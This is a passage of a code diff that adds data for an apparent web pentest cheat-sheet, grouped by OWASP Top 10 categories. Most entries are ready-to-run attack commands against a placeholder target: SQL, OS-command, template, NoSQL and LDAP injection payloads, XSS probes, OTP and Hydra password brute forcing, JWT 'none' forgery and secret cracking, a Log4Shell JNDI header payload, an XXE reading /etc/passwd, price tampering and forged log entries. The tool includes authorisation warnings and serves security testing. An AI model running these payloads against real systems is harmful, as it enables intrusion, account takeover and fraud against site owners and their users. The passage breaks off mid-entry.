+       c:"time curl -s 'https://{T}/search?q=test%27%20AND%20SLEEP(5)--%20-' -o /dev/null && time curl -s 'https://{T}/search?q=test' -o /dev/null",
+       e:"Manually tests time-based blind SQL injection by injecting SLEEP(5) and comparing response times. If the first request takes 5+ seconds longer than the second request the parameter is vulnerable to time-based blind SQLi even with no visible output or error messages."},
+      {l:"OS command injection test", r:"critical",
+       c:"for payload in ';id' '|id' '$(id)' '%3Bid' '`id`'; do resp=$(curl -s \"https://{T}/ping?host=127.0.0.1$payload\"); echo \"$resp\" | grep -qiE '(uid=|root|www-data)' && echo \"CMD INJECTION with: $payload\" || echo \"No injection: $payload\"; done",
+       e:"Tests common OS command injection separators against a parameter likely to execute system commands. Seeing uid= or a username in the response confirms remote code execution. Command injection in a ping or DNS lookup field is one of the most critical web findings."},
+      {l:"Server-Side Template Injection (SSTI)", r:"critical",
+       c:"for payload in '{{7*7}}' '${7*7}' '<%= 7*7 %>' '#{7*7}' '*{7*7}'; do resp=$(curl -s \"https://{T}/render?template=$payload\"); echo \"$resp\" | grep -q '49' && echo \"SSTI CONFIRMED with: $payload\" || echo \"No SSTI: $payload\"; done",
+       e:"Tests template injection by injecting arithmetic expressions into template rendering parameters. If 49 appears in the response the server evaluated 7*7 confirming the template engine processes user input. SSTI can escalate to full RCE through template engine native methods."},
+      {l:"NoSQL injection test", r:"high",
+       c:"curl -s -X POST 'https://{T}/api/login' -H 'Content-Type: application/json' -d '{\"username\":{\"$gt\":\"\"},\"password\":{\"$gt\":\"\"}}' -w '\nHTTP: %{http_code}' | head -5",
+       e:"Tests MongoDB NoSQL injection using the $gt operator which evaluates to always-true. A successful login response (200 or redirect) with these payloads means the application is vulnerable to authentication bypass via NoSQL injection."},
+      {l:"LDAP injection test", r:"high",
+       c:"for payload in '*' '*)(&' '*)(uid=*))(|(uid=*' 'admin*'; do code=$(curl -s -o /dev/null -w '%{http_code}' -X POST 'https://{T}/login' --data-urlencode \"username=$payload\" --data-urlencode 'password=x'); echo \"LDAP payload '$payload': HTTP $code\"; done",
+       e:"Tests LDAP injection payloads in the username field. The wildcard * in LDAP matches everything and can bypass authentication. A 200 response to the * username payload against an LDAP-backed login confirms LDAP injection vulnerability."},
+      {l:"XSS reflected injection test", r:"high",
+       c:"for param in q s search query name input; do resp=$(curl -s \"https://{T}/search?${param}=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E\"); echo \"$resp\" | grep -qi 'alert(document.domain)' && echo \"REFLECTED XSS in: $param\"; done",
+       e:"Tests common input parameters for reflected XSS by injecting a script tag with document.domain and checking if the payload appears unencoded in the HTML response. If found open the URL in a browser to capture the alert dialog as screenshot evidence."}
+    ]
+  },
+  {
+    id:"a04", icon:"&#127775;", badge:"b-a04",
+    title:"A04 — Insecure Design",
+    desc:"Insecure design refers to flaws in the architecture, design patterns, and business logic that cannot be fixed by proper implementation. These are missing or ineffective security controls at the design level.",
+    where:"Look in multi-step business workflows (checkout, password reset, order flows), rate limiting absence on sensitive operations, password reset mechanisms, email verification bypasses, account enumeration via timing or messages, and logic that trusts client-supplied values for pricing, discounts, or quantities.",
+    exploit:"Submit negative quantities in purchase flows to receive credits. Skip steps in multi-step verification by jumping to the final endpoint directly. Enumerate valid usernames via different error messages on login. Brute-force OTP codes with no rate limiting. Reuse a single-use password reset token multiple times. Modify item prices in the request body during checkout.",
+    tip:"Business logic vulnerabilities require manual testing — no automated scanner finds them. Map the entire user journey first then test what happens when you violate the expected sequence or send unexpected values.",
+    warn:"Do not actually complete fraudulent transactions or purchases. Test in a sandbox environment or report immediately when you discover the design flaw without fully exploiting it. Use a test account with $0 value.",
+    flags:[
+      {f:"-X POST", d:"Send POST request for form submission testing"},
+      {f:"-d 'qty=-1'", d:"Test negative/unexpected values in business logic"},
+      {f:"--max-time 5", d:"curl: set request timeout for timing-based enumeration"},
+      {f:"-w '%{time_total}'", d:"curl: measure response time for timing attacks"},
+      {f:"-c/-b cookies.txt", d:"Save and replay cookies for multi-step flow testing"}
+    ],
+    cmds:[
+      {l:"Username enumeration via response", r:"medium",
+       c:"for user in admin administrator root test user1 john.doe; do resp=$(curl -s -X POST 'https://{T}/login' -d \"username=$user&password=WRONG_PASS\"); echo -n \"$user: \"; echo \"$resp\" | grep -oiE '(invalid password|user not found|incorrect|no account)' | head -1; done",
+       e:"Tests whether the login endpoint returns different error messages for valid vs invalid usernames. 'Invalid password' for valid users vs 'User not found' for invalid users confirms username enumeration — an insecure design flaw that aids credential stuffing attacks."},
+      {l:"OTP/2FA brute force (no rate limit)", r:"high",
+       c:"for code in $(seq -w 0000 9999 | head -100); do resp=$(curl -s -w '%{http_code}' -X POST 'https://{T}/verify-otp' -H 'Cookie: session=YOUR_SESSION' -d \"otp=$code\" -o /dev/null); [ \"$resp\" = '200' ] && echo \"VALID OTP: $code\" && break; echo -n \".\"; done",
+       e:"Brute-forces a 4-digit OTP code without triggering rate limiting. Tests the first 100 combinations — if no lockout occurs after 10-20 attempts the application lacks rate limiting. A full 4-digit brute force has 10000 combinations. 6-digit has 1 million."},
+      {l:"Password reset token reuse test", r:"high",
+       c:"TOKEN='YOUR_RESET_TOKEN' && for i in 1 2 3; do code=$(curl -s -o /dev/null -w '%{http_code}' -X POST 'https://{T}/reset-password' -d \"token=$TOKEN&password=NewPass123\"); echo \"Use #$i: HTTP $code\"; done",
+       e:"Attempts to use the same password reset token multiple times. A 200 response on the second and third use confirms the token is not invalidated after first use allowing any attacker with a leaked token to repeatedly reset the password."},
+      {l:"Timing-based username enumeration", r:"medium",
+       c:"for user in admin INVALID_USER_XYZ123 root; do time=$(curl -s -o /dev/null -w '%{time_total}' -X POST 'https://{T}/login' -d \"username=$user&password=WRONGPASS\"); echo \"$user: ${time}s\"; done",
+       e:"Measures response time for different usernames. If valid usernames take longer (e.g. because a password hash comparison runs) versus invalid ones that fail fast this timing difference reveals valid accounts without any visible message difference."},
+      {l:"Price manipulation in checkout", r:"critical",
+       c:"curl -s -X POST 'https://{T}/api/cart/checkout' -H 'Cookie: session=YOUR_SESSION' -H 'Content-Type: application/json' -d '{\"items\":[{\"id\":1,\"qty\":1,\"price\":0.01}],\"total\":0.01}' -w '\nHTTP: %{http_code}'",
+       e:"Modifies the price field in the checkout POST body to an arbitrarily low value. If the server trusts client-supplied pricing instead of recalculating from the database this is a critical business logic flaw. Test with a price of 0.01 and observe if the order processes."},
+      {l:"Multi-step flow step-skip test", r:"high",
+       c:"echo 'Step 1 - Start checkout:' && curl -s -c /tmp/flow_cookies 'https://{T}/checkout/start' -o /dev/null -w 'HTTP: %{http_code}\n' && echo 'Step 3 - Skip to confirm (bypassing step 2):' && curl -s -b /tmp/flow_cookies 'https://{T}/checkout/confirm' -w 'HTTP: %{http_code}\n'",
+       e:"Attempts to skip intermediate steps in a multi-step checkout or verification workflow. If jumping directly from step 1 to step 3 succeeds the application does not enforce workflow state validation — a business logic bypass that could skip payment or verification steps."}
+    ]
+  },
+  {
+    id:"a05", icon:"&#9881;", badge:"b-a05",
+    title:"A05 — Security Misconfiguration",
+    desc:"Security misconfiguration is the most common finding. It results from insecure defaults, incomplete or ad hoc configurations, open cloud storage, verbose error messages, unnecessary features, and missing security hardening.",
+    where:"Look in HTTP response headers for missing security headers, error pages that expose stack traces and internal paths, directory listing enabled on web servers, default admin credentials on framework consoles, exposed admin interfaces, cloud storage buckets with public read access, and debug endpoints left active in production.",
+    exploit:"Access directory listings to browse server files. Read stack traces from 500 errors to map internal architecture. Login to admin consoles with default credentials (admin/admin, admin/password). Read files from public S3 buckets. Access exposed Swagger/OpenAPI specs to map all undocumented API endpoints. Enable debug mode via a URL parameter.",
+    tip:"Check /actuator, /actuator/env, /.git/, /phpinfo.php, /server-status, /api-docs, /swagger-ui.html immediately. These are the highest-yield misconfiguration endpoints and are found on a surprising number of production servers.",
+    warn:"Do not download or exfiltrate data from misconfigured cloud storage beyond a single small file proving access. Do not attempt to modify or delete any files or database contents. Take a screenshot as evidence and report immediately.",
+    flags:[
+      {f:"-sV --script http-headers", d:"nmap: extract HTTP response headers from service"},
+      {f:"--list-files", d:"aws s3: list files in a public S3 bucket"},
+      {f:"-I", d:"curl: HEAD request to check headers without downloading body"},
+      {f:"--follow-redirects", d:"ffuf: follow HTTP redirects during directory discovery"},
+      {f:"-mc 200,403", d:"ffuf: match both accessible and forbidden endpoints (403 confirms existence)"}
+    ],
+    cmds:[
+      {l:"Security headers audit", r:"medium",
+       c:"curl -sI 'https://{T}' | tee /tmp/headers_{T}.txt && echo '=== Missing Security Headers ===' && for h in 'Strict-Transport-Security' 'Content-Security-Policy' 'X-Frame-Options' 'X-Content-Type-Options' 'Referrer-Policy' 'Permissions-Policy'; do grep -qi \"$h\" /tmp/headers_{T}.txt && echo \"OK: $h\" || echo \"MISSING: $h\"; done",
+       e:"Retrieves all HTTP response headers and checks for each critical security header. Missing HSTS allows HTTP downgrade. Missing CSP enables XSS. Missing X-Frame-Options allows clickjacking. Each missing header is a reportable low-to-medium finding depending on the program."},
+      {l:"Spring Boot Actuator exposure", r:"critical",
+       c:"for ep in '/actuator' '/actuator/env' '/actuator/health' '/actuator/mappings' '/actuator/beans' '/actuator/httptrace' '/actuator/dump'; do code=$(curl -s -o /dev/null -w '%{http_code}' 'https://{T}'$ep); [ \"$code\" != '404' ] && echo \"FOUND $ep: HTTP $code\" && curl -s 'https://{T}'$ep | python3 -m json.tool 2>/dev/null | head -10; done",
+       e:"Checks for exposed Spring Boot Actuator endpoints. /actuator/env exposes all environment variables including database passwords and API keys. /actuator/httptrace shows recent HTTP requests including authentication headers. These are critical misconfigurations on Java applications."},
+      {l:"Directory listing discovery", r:"medium",
+       c:"for path in '/' '/uploads/' '/static/' '/files/' '/backup/' '/assets/' '/images/' '/docs/' '/logs/'; do resp=$(curl -s 'https://{T}'$path); echo \"$resp\" | grep -qi 'index of' && echo \"DIRECTORY LISTING ENABLED: $path\"; done",
+       e:"Checks common directories for enabled directory listing. A web server showing 'Index of /' in the response allows browsing all files in that directory. This can expose source code archives, log files, uploaded user files, and backup databases."},
+      {l:"Default credentials test", r:"critical",
+       c:"for cred in 'admin:admin' 'admin:password' 'admin:123456' 'root:root' 'admin:' 'test:test'; do u=$(echo $cred|cut -d: -f1); p=$(echo $cred|cut -d: -f2); code=$(curl -s -o /dev/null -w '%{http_code}' -X POST 'https://{T}/admin/login' -d \"username=$u&password=$p\"); [ \"$code\" = '200' ] || [ \"$code\" = '302' ] && echo \"DEFAULT CREDS WORK: $cred\"; done",
+       e:"Tests the most common default credential combinations against the admin login endpoint. Default credentials on production admin panels are a critical misconfiguration. Adjust the endpoint path to match the actual admin login URL discovered during enumeration."},
+      {l:"Exposed Git repository check", r:"critical",
+       c:"for f in '/.git/config' '/.git/HEAD' '/.git/COMMIT_EDITMSG' '/.gitignore'; do code=$(curl -s -o /dev/null -w '%{http_code}' 'https://{T}'$f); [ \"$code\" = '200' ] && echo \"GIT EXPOSED: $f\" && curl -s 'https://{T}'$f | head -5; done",
+       e:"Checks for an exposed .git directory which allows cloning the entire application source code. If /.git/config returns 200 use git-dumper to extract the full repository. Source code access reveals all hardcoded secrets, business logic, and further attack surface."},
+      {l:"Verbose error message trigger", r:"low",
+       c:"for payload in \"'\" '\"' '%00' '../' '${jndi:ldap://x}' '{{invalid}}'; do resp=$(curl -s \"https://{T}/search?q=$payload\"); echo \"$resp\" | grep -iE '(exception|stack trace|error at|line [0-9]+|sql syntax|warning:|fatal error)' | head -2 | while read l; do echo \"ERROR DISCLOSURE with '$payload': $l\"; done; done",
+       e:"Triggers error conditions with malformed inputs to check whether the application returns verbose error messages exposing stack traces, file paths, SQL queries, or framework versions. Error messages revealing internal paths and class names significantly aid further exploitation."},
+      {l:"Public S3 bucket enumeration", r:"high",
+       c:"for name in '{T}' '{T}-backup' '{T}-assets' '{T}-uploads' '{T}-static' '{T}-dev'; do code=$(curl -s -o /dev/null -w '%{http_code}' \"https://$name.s3.amazonaws.com/\"); [ \"$code\" = '200' ] && echo \"PUBLIC BUCKET: $name\" && curl -s \"https://$name.s3.amazonaws.com/\" | grep -o '<Key>[^<]*' | head -10; done",
+       e:"Tests common S3 bucket naming patterns derived from the target domain. A 200 response with an XML file listing confirms a public bucket. Public S3 buckets may contain user uploaded files, database backups, internal documents, and application assets with sensitive data."}
+    ]
+  },
+  {
+    id:"a06", icon:"&#128268;", badge:"b-a06",
+    title:"A06 — Vulnerable & Outdated Components",
+    desc:"Components such as libraries, frameworks, and software modules run with the same privileges as the application. Outdated components with known vulnerabilities can be exploited to achieve the same impact as the original flaw.",
+    where:"Look in HTTP response headers for server version banners (Server: Apache/2.4.49), HTML source code comments referencing library versions, JavaScript bundle filenames with version numbers, package.json or requirements.txt exposed on the server, /README files, /CHANGELOG, and CMS-specific version files like /wp-includes/version.php.",
+    exploit:"Identify the exact version of WordPress, jQuery, Struts, Log4j, or other components from banners or files. Search NVD (nvd.nist.gov) or ExploitDB for CVEs affecting that version. Use nuclei CVE templates to test for specific known vulnerabilities. Check if Log4Shell (CVE-2021-44228) or Spring4Shell (CVE-2022-22965) payloads trigger OOB callbacks.",
+    tip:"Nuclei CVE templates are the fastest way to test for known component vulnerabilities. Run nuclei with -tags cve against the target. Even if a component is patched the banner may still show the old version string — always verify exploitability manually.",
+    warn:"Only test CVE exploits that are non-destructive. Skip any PoC that causes denial of service or overwrites files. Confirm the version before attempting any CVE exploit. A version banner match does not guarantee exploitability.",
+    flags:[
+      {f:"-tags cve", d:"nuclei: run only CVE-category templates"},
+      {f:"-severity critical,high", d:"nuclei: filter by minimum severity"},
+      {f:"-t cves/", d:"nuclei: specify CVE template directory"},
+      {f:"-H 'User-Agent: ...'", d:"curl: set custom UA to avoid bot detection during version probing"},
+      {f:"-o output.txt", d:"nuclei: save results to file for report"}
+    ],
+    cmds:[
+      {l:"Server banner and version extraction", r:"info",
+       c:"curl -sI 'https://{T}' | grep -iE '(server|x-powered-by|x-aspnet-version|x-generator|x-drupal|via)' && nmap -sV -p 80,443 --version-intensity 9 {T} 2>/dev/null | grep -E '(open|http)'",
+       e:"Extracts server version banners from HTTP response headers and nmap service detection. The Server header often reveals Apache/Nginx version numbers. X-Powered-By reveals PHP, ASP.NET, or Express versions. Each version can be cross-referenced against known CVEs."},
+      {l:"WordPress version and plugin scan", r:"high",
+       c:"curl -s 'https://{T}/wp-includes/version.php' | grep wp_version && curl -s 'https://{T}/readme.html' | grep -iE '(version [0-9]|release)' | head -3 && wpscan --url 'https://{T}' --enumerate p,t,u --random-user-agent 2>/dev/null | head -50",
+       e:"Detects WordPress version from version.php and readme.html then uses WPScan to enumerate installed plugins, themes, and users. Outdated WordPress plugins are the most common source of web application vulnerabilities. Each plugin with a version can be checked against WPVulnDB."},
+      {l:"JavaScript library version detection", r:"medium",
+       c:"curl -s 'https://{T}' | grep -oE '(jquery|angular|react|vue|bootstrap|lodash|moment)[/@v-][0-9]+\\.[0-9]+\\.[0-9]+' | sort -u | while read lib; do echo \"Library: $lib\"; done",
+       e:"Extracts JavaScript library names and versions from HTML source. Outdated jQuery versions are vulnerable to XSS. Old Angular versions have known template injection issues. Compare found versions against the library's security advisories."},
+      {l:"Nuclei CVE template scan", r:"high",
+       c:"nuclei -u 'https://{T}' -tags cve -severity critical,high -rate-limit 20 -o ~/pentest/{T}/cve_findings.txt 2>/dev/null && cat ~/pentest/{T}/cve_findings.txt",
+       e:"Runs all nuclei CVE templates against the target filtered to critical and high severity. Nuclei covers Log4Shell, Spring4Shell, Apache vulnerabilities, CMS CVEs, and hundreds more. Results require manual verification but provide fast coverage of known vulnerability patterns."},
+      {l:"Log4Shell CVE-2021-44228 test", r:"critical",
+       c:"curl -s -H 'X-Api-Version: ${jndi:ldap://YOUR_COLLAB_SERVER/log4shell}' 'https://{T}/' && curl -s -H 'User-Agent: ${jndi:ldap://YOUR_COLLAB_SERVER/log4shell}' 'https://{T}/'",
+       e:"Tests for Log4Shell by injecting the JNDI lookup payload into common headers. Replace YOUR_COLLAB_SERVER with a Burp Collaborator or interactsh server. An incoming DNS/HTTP request to your server confirms the target is vulnerable to CVE-2021-44228 Log4j RCE."},
+      {l:"Retire.js outdated JS detection", r:"medium",
+       c:"which retire 2>/dev/null && retire --js --jsrepo retire-repo.json --outputformat json --path /tmp/jsfiles/ 2>/dev/null || echo 'Install: npm install -g retire && retire --url https://{T}'",
+       e:"Uses Retire.js to scan JavaScript files for known vulnerable library versions. Retire.js maintains a database of JavaScript libraries with known security issues. It detects vulnerabilities in jQuery, AngularJS, Bootstrap, and 500+ other libraries used by the target."}
+    ]
+  },
+  {
+    id:"a07", icon:"&#128273;", badge:"b-a07",
+    title:"A07 — Identification & Authentication Failures",
+    desc:"Formerly Broken Authentication. Confirmation of user identity, authentication, and session management are critical. Failures allow attackers to compromise passwords, keys, or session tokens to assume other users identities.",
+    where:"Look at login forms for brute-force protection, password reset flows, session token randomness and length, session invalidation on logout, multi-factor authentication implementation, remember-me token security, OAuth flows and state parameter validation, and JWT signature algorithm handling (especially the 'none' algorithm bypass).",
+    exploit:"Brute-force login with common password lists using Hydra. Forge JWTs by changing the algorithm to 'none' and removing the signature. Reuse session tokens after logout. Crack weak JWT secrets with hashcat. Exploit OAuth state parameter CSRF. Bypass 2FA by intercepting and replaying OTP codes. Test if sessions expire properly after password change.",
+    tip:"JWT security issues are extremely common. Always check: 1) algorithm confusion (RS256 to HS256), 2) none algorithm, 3) weak HMAC secret. Use jwt.io to decode and jwt_tool to systematically attack JWT tokens. These issues are often critical and fast to exploit.",
+    warn:"Never attempt to access real user accounts. Use only accounts you created and control. Brute-force testing should be rate-limited and targeted — mass brute-force of production logins violates program rules and can be considered an attack.",
+    flags:[
+      {f:"-l USER -P passlist.txt", d:"hydra: single username with password list"},
+      {f:"-L userlist.txt -P passlist.txt", d:"hydra: both username and password lists"},
+      {f:"-t 4", d:"hydra: 4 parallel threads (use low values on production)"},
+      {f:"-s PORT", d:"hydra: specify non-standard port"},
+      {f:"--form-data", d:"ffuf: POST form data for login brute force"}
+    ],
+    cmds:[
+      {l:"JWT none algorithm bypass", r:"critical",
+       c:"python3 -c \"\nimport base64, json\ntoken = 'YOUR_JWT_TOKEN'\nparts = token.split('.')\nheader = json.loads(base64.b64decode(parts[0] + '==').decode())\nheader['alg'] = 'none'\nnew_header = base64.b64encode(json.dumps(header).encode()).decode().rstrip('=')\nnew_token = new_header + '.' + parts[1] + '.\'\nprint('Modified token:', new_token)\n\"",
+       e:"Modifies a JWT token to use the 'none' algorithm which means no signature is required. Some JWT libraries accept unsigned tokens when alg=none. Submit the resulting token in requests — if the server accepts it as valid this is a critical authentication bypass vulnerability."},
+      {l:"JWT weak secret brute force", r:"critical",
+       c:"hashcat -a 0 -m 16500 'YOUR.JWT.TOKEN' /usr/share/wordlists/rockyou.txt 2>/dev/null | grep ':' | tail -5",
+       e:"Attempts to crack the HMAC secret used to sign the JWT using the rockyou wordlist. If the secret is a common word or short string hashcat can crack it in seconds. With the secret you can forge arbitrary JWT tokens with any user ID or role claim."},
+      {l:"Session fixation test", r:"high",
+       c:"PRE=$(curl -s -c /tmp/pre_login.txt 'https://{T}/login' -I | grep -i set-cookie | grep -o 'session=[^;]*'); curl -s -b /tmp/pre_login.txt -X POST 'https://{T}/login' -d 'username=YOUR_USER&password=YOUR_PASS' -c /tmp/post_login.txt -o /dev/null; POST=$(grep session /tmp/post_login.txt | awk '{print $NF}'); echo \"Pre-login: $PRE\"; echo \"Post-login: $POST\"; [ \"$PRE\" = \"$POST\" ] && echo 'SESSION FIXATION: token unchanged after login'",
+       e:"Checks if the session token changes after successful authentication. If the session ID before login equals the session ID after login the application is vulnerable to session fixation. An attacker who sets a known session ID can take over the session after the victim logs in."},
+      {l:"Password brute force with Hydra", r:"high",
+       c:"hydra -l admin -P /usr/share/wordlists/rockyou.txt {T} https-post-form '/login:username=^USER^&password=^PASS^:Invalid password' -t 4 -V 2>/dev/null | grep 'host:' | head -5",
+       e:"Uses Hydra to brute-force the admin account password against the login form. The -t 4 limits to 4 threads to avoid rate limit triggers. Replace the form action path and failure string with the actual values from the login page. Always check the program allows automated login testing first."},
+      {l:"Session invalidation after logout", r:"medium",
+       c:"SESSION=$(curl -s -c /tmp/sess.txt -X POST 'https://{T}/login' -d 'username=YOUR_USER&password=YOUR_PASS' -I | grep -i set-cookie | grep -o 'session=[^;]*') && curl -s -b /tmp/sess.txt 'https://{T}/logout' -o /dev/null && code=$(curl -s -o /dev/null -w '%{http_code}' -H \"Cookie: $SESSION\" 'https://{T}/api/profile') && echo \"Post-logout profile access: HTTP $code\" && [ \"$code\" = '200' ] && echo 'SESSION NOT INVALIDATED AFTER LOGOUT'",
+       e:"Logs in, captures the session token, logs out, then attempts to use the old session token. If the profile endpoint returns 200 after logout the server-side session was not invalidated. This means stolen session tokens remain valid indefinitely after the user logs out."},
+      {l:"OAuth state CSRF test", r:"high",
+       c:"echo 'Manual test steps:' && echo '1. Start OAuth flow and capture the authorization URL' && echo '2. Note the state parameter value' && echo '3. Replace state with a known fixed value: state=FIXED123' && echo '4. Complete the OAuth flow' && echo '5. If the callback is accepted without state validation -> CSRF in OAuth flow' && curl -s 'https://{T}/auth/callback?code=INVALID&state=FIXED123' -w 'HTTP: %{http_code}'",
+       e:"Tests whether the OAuth callback endpoint validates the state parameter. The state parameter prevents CSRF in OAuth flows. If the callback accepts requests with an arbitrary state value an attacker can initiate a login flow and trick a victim into completing it with the attacker's token."}
+    ]
+  },
+  {
+    id:"a08", icon:"&#128203;", badge:"b-a08",
+    title:"A08 — Software & Data Integrity Failures",
+    desc:"Software and data integrity failures relate to code and infrastructure that does not protect against integrity violations. Examples include insecure deserialization, malicious code in CI/CD pipelines, auto-update without integrity checks, and unsigned software.",
+    where:"Look in serialized data being sent in cookies or POST bodies (Java serialized objects start with rO0AB, PHP serialization looks like O:4:User), CI/CD pipeline configurations accessible externally, npm/pip dependency files that may be supply-chain attacked, and update mechanisms that download packages without signature verification.",
+    exploit:"Inject a malicious Java deserialization payload via ysoserial into a cookie containing a serialized object. Modify PHP serialized objects in cookies to change user roles or object types. Test XML entity injection in SOAP/XML APIs. Inject into CI/CD webhooks to execute arbitrary pipeline commands. Check if package managers pull from untrusted registries.",
+    tip:"The easiest deserialization test is a SSRF/DNS callback via ysoserial URLDNS gadget chain. It is non-destructive and only makes a DNS query. If your DNS listener gets a hit the endpoint is vulnerable to Java deserialization and you can escalate to RCE payloads.",
+    warn:"Never use ysoserial RCE gadget chains on production systems without explicit written permission. A deserialization RCE payload can crash the JVM or corrupt application state. Use URLDNS gadget only for detection. Report the finding and let the program triage before demonstrating RCE.",
+    flags:[
+      {f:"-jar ysoserial.jar", d:"Java: run ysoserial payload generator"},
+      {f:"URLDNS 'http://collab'", d:"ysoserial: DNS-only gadget safe for detection"},
+      {f:"CommonsCollections6", d:"ysoserial: most compatible RCE gadget (requires confirmation)"},
+      {f:"-H 'Content-Type: application/x-java-serialized-object'", d:"Set correct content type for serialized data"},
+      {f:"base64 -d | xxd | head", d:"Decode and inspect binary serialized blobs"}
+    ],
+    cmds:[
+      {l:"Detect Java serialized object in request", r:"high",
+       c:"curl -sI 'https://{T}/' | grep -i set-cookie | while read c; do echo $c | grep -o '[A-Za-z0-9+/=]\{20,\}' | while read val; do decoded=$(echo $val | base64 -d 2>/dev/null | xxd | head -1); echo $decoded | grep -q 'aced 0005' && echo \"JAVA SERIALIZED OBJECT IN COOKIE: $val\"; done; done",
+       e:"Checks if any cookie value decodes to a Java serialized object (magic bytes ACED 0005). The presence of Java serialized objects in cookies is a strong indicator of a deserialization vulnerability. These should be tested with ysoserial URLDNS gadget for OOB detection."},
+      {l:"PHP deserialization object injection", r:"critical",
+       c:"python3 -c \"\nimport base64\n# Test PHP serialized object manipulation\norig = 'O:4:\\\"User\\\":2:{s:4:\\\"role\\\";s:4:\\\"user\\\";s:2:\\\"id\\\";i:1;}'\nmalicious = 'O:4:\\\"User\\\":2:{s:4:\\\"role\\\";s:5:\\\"admin\\\";s:2:\\\"id\\\";i:1;}'\nprint('Original:', orig)\nprint('Modified:', malicious)\nprint('Base64:', base64.b64encode(malicious.encode()).decode())\n\"",
+       e:"Demonstrates PHP serialized object modification to escalate the role field from user to admin. If the application uses unserialize() on a cookie value without signature verification submitting the modified base64-encoded payload may grant admin access."},
+      {l:"ysoserial URLDNS detection payload", r:"high",
+       c:"which ysoserial 2>/dev/null || echo 'Download: https://github.com/frohoff/ysoserial' && java -jar ysoserial.jar URLDNS 'http://COLLAB.YOUR_SERVER.com/deser-test' 2>/dev/null | base64 -w0 > /tmp/deser_payload.txt && echo 'Payload ready - inject into serialized cookie field and check DNS listener'",
+       e:"Generates a Java deserialization URLDNS gadget payload that makes a DNS lookup to your server without executing any code. Inject this base64 payload into any field that contains a Java serialized object. If your DNS listener receives a hit the endpoint is vulnerable to deserialization."},
+      {l:"XXE in XML API endpoint", r:"critical",
+       c:"curl -s -X POST 'https://{T}/api/import' -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root><data>&xxe;</data></root>' | head -10",
+       e:"Tests for XML External Entity injection by injecting a DOCTYPE that references the local /etc/passwd file. If the response contains Linux user data the application is vulnerable to XXE allowing local file read. Escalate to SSRF by using http:// instead of file:// URIs."},
+      {l:"CI/CD pipeline config exposure", r:"high",
+       c:"for path in '/.github/workflows/' '/.gitlab-ci.yml' '/Jenkinsfile' '/.circleci/config.yml' '/azure-pipelines.yml' '/bitbucket-pipelines.yml'; do code=$(curl -s -o /dev/null -w '%{http_code}' 'https://{T}'$path); [ \"$code\" = '200' ] && echo \"EXPOSED CI/CD CONFIG: $path\" && curl -s 'https://{T}'$path | head -20; done",
+       e:"Checks for exposed CI/CD pipeline configuration files. These files reveal deployment secrets, internal infrastructure, and pipeline commands. Exposed pipeline configs sometimes contain hardcoded tokens or show how to trigger privileged deployments."}
+    ]
+  },
+  {
+    id:"a09", icon:"&#128396;", badge:"b-a09",
+    title:"A09 — Security Logging & Monitoring Failures",
+    desc:"Insufficient logging and monitoring, coupled with missing or ineffective integration with incident response, allows attackers to further attack systems, maintain persistence, pivot, and exfiltrate or destroy data undetected.",
+    where:"Look for the absence of rate limiting on authentication endpoints (can you attempt 100 logins without lockout?), missing audit trails for sensitive operations, no alerting on repeated authorization failures, exposed log files accessible via web, and verbose application logs showing internal operations accessible to end users.",
+    exploit:"Perform 50+ failed login attempts without getting locked out or seeing any CAPTCHA — confirms missing brute-force detection. Access /logs/, /debug/, /trace endpoints to read application logs. Inject newline characters (CRLF) into logged fields to forge log entries. Look for log files at /var/log/ via LFI to understand what is and is not being logged.",
+    tip:"This category is often marked as informative by bug bounty programs since it is hard to demonstrate direct impact. Pair it with another vulnerability — show that a successful SQLi or account takeover left zero server-side evidence. This combination demonstrates real business risk.",
+    warn:"CRLF injection in logs can be used to forge evidence or hide attack activity. Only demonstrate log injection to show the vulnerability — never use it to cover tracks or manipulate records. Altering log integrity is destruction of potential evidence.",
+    flags:[
+      {f:"-v", d:"curl: show request/response details to document the full exchange"},
+      {f:"--limit-rate 10k", d:"curl: slow down requests to test detection thresholds"},
+      {f:"-w '%{http_code}'", d:"curl: capture HTTP status for response analysis"},
+      {f:"-H 'X-Forwarded-For: 1.2.3.4'", d:"Spoof source IP to test if logging captures real IP"},
+      {f:"| tee logtest.txt", d:"Save all output to file for report evidence"}
+    ],
+    cmds:[
+      {l:"Brute force detection absence test", r:"medium",
+       c:"for i in $(seq 1 25); do code=$(curl -s -o /dev/null -w '%{http_code}' -X POST 'https://{T}/login' -d 'username=admin&password=WRONGPASS_'$i); echo -n \"Attempt $i: HTTP $code \"; [ \"$code\" = '429' ] && echo '(RATE LIMITED)' && break || echo; done",
+       e:"Attempts 25 consecutive failed logins and monitors for 429 Too Many Requests or account lockout. If all 25 attempts return 200 or 401 without any throttling the application lacks brute-force protection. This finding should be reported as a security logging and monitoring failure combined with A07."},
+      {l:"CRLF log injection test", r:"medium",
+       c:"curl -s 'https://{T}/search?q=test%0d%0a[FORGED LOG ENTRY] User admin logged in from 192.168.1.1' -o /dev/null -w 'HTTP: %{http_code}'",
+       e:"Tests for CRLF injection by inserting carriage return and line feed characters into a logged parameter. If the application logs the query parameter and does not sanitize newlines an attacker can inject fake log entries to confuse incident responders or hide malicious activity."},
+      {l:"Exposed log file discovery", r:"high",
+       c:"for path in '/logs/' '/log/' '/debug/' '/trace/' '/error.log' '/access.log' '/application.log' '/app.log' '/debug.log' '/server.log'; do code=$(curl -s -o /dev/null -w '%{http_code}' 'https://{T}'$path); [ \"$code\" = '200' ] && echo \"EXPOSED LOG: $path\" && curl -s 'https://{T}'$path | head -5; done",
+       e:"Checks for web-accessible log files that expose internal application activity, user actions, stack traces, or sensitive data. Application logs accessible via browser are a critical finding as they may contain authentication tokens, API keys, and user PII."},
+      {l:"IP spoofing in logged requests", r:"low",
+       c:"curl -s -H 'X-Forwarded-For: 192.168.0.1' -H 'X-Real-IP: 10.0.0.1' -H 'X-Originating-IP: 127.0.0.1' 'https://{T}/login' -X POST -d 'username=admin&password=test' -o /dev/null -w 'HTTP: %{http_code}'",
+       e:"Tests if the application trusts X-Forwarded-For for logging the client IP. If the application logs the spoofed header value instead of the real TCP source IP, attackers can perform thousands of brute-force attempts while appearing to come from different or internal IP addresses."},
+      {l:"Sensitive operation without audit trail", r:"medium",
+       c:"echo 'Test audit logging manually:' && echo '1. Perform a sensitive action (password change, email update, privilege grant)' && echo '2. Check if the action appears in accessible activity logs' && curl -s -H 'Cookie: session=YOUR_SESSION' 'https://{T}/api/activity-log' | python3 -m json.tool | tail -10",
